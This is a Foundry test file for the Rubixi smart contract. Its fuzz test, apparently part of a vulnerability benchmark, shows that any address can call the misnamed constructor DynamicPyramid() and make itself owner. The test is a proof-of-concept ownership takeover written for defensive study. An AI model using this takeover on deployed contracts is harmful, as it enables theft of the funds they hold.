
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi public _contractUnderTest;
    address public originalDeployer;

    function setUp() public {
        originalDeployer = address(this);
        _contractUnderTest = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // The vulnerability is that DynamicPyramid() can be called by anyone
        // to become the creator/owner. We don't need to exclude the original deployer
        // because the point is to prove ANY arbitrary user can call this function.

        // --- 2. State Configuration ---
        // No special state needed - the vulnerability exists from deployment

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY: Call DynamicPyramid() which should be a constructor
        // but is actually a public function anyone can call to become the owner
        _contractUnderTest.DynamicPyramid();

        // The test passes if the call succeeds (no revert)
        // This proves the vulnerability: an arbitrary user was able to call
        // DynamicPyramid() and become the creator/owner of the contract
    }
}
